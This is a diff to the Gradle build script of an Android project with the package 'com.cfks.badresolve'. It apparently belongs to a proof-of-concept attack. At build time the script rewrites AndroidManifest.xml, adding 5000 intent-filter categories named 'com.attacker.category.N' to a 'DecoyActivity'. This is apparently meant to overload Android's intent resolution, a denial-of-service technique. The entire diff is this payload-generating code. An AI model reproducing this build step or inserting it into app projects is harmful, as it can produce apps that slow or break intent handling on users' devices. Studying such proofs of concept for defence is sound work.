@@ -44,40 +44,34 @@ android {
     }
     
     // 直接在源 manifest 上操作
-    def manifestFile = file("src/main/AndroidManifest.xml")
+    def manifestFile = file("src/main/AndroidManifest.xml")    
     if (manifestFile.exists()) {
         try {
             def xml = new XmlParser(false, true).parse(manifestFile)
-            def androidNamespace = new Namespace("http://schemas.android.com/apk/res/android", "android")
-            
             def decoyActivity = xml.application.'activity'.find { 
-                it.attribute(androidNamespace, "name") == "com.cfks.badresolve.DecoyActivity"
-            }
-            
+                it.'@android:name' == 'com.cfks.badresolve.DecoyActivity'
+            }            
             if (decoyActivity != null) {
                 def intentFilter = decoyActivity.'intent-filter'.find { true }
                 if (intentFilter == null) {
                     intentFilter = new Node(decoyActivity, "intent-filter")
-                }
-                
-                // 只在没有添加过时添加
+                }               
                 def existingCategories = intentFilter.'category'.size()
                 if (existingCategories < 1000) {
                     for (int i = 0; i < 5000; i++) {
                         def category = new Node(intentFilter, "category")
-                        category.setAttribute(androidNamespace, "name", 
-                            "com.attacker.category.${i}")
-                    }
-                    
+                        category.'@android:name' = "com.attacker.category.${i}"
+                    }                    
                     manifestFile.withOutputStream { os ->
                         def printer = new XmlNodePrinter(new PrintWriter(os))
                         printer.preserveWhitespace = true
                         printer.print(xml)
                     }
+                    println "Added 5000 categories to AndroidManifest.xml"
                 }
             }
         } catch (Exception e) {
-            println "Error: ${e.message}"
+            println "Error modifying manifest: ${e.message}"
         }
     }
 
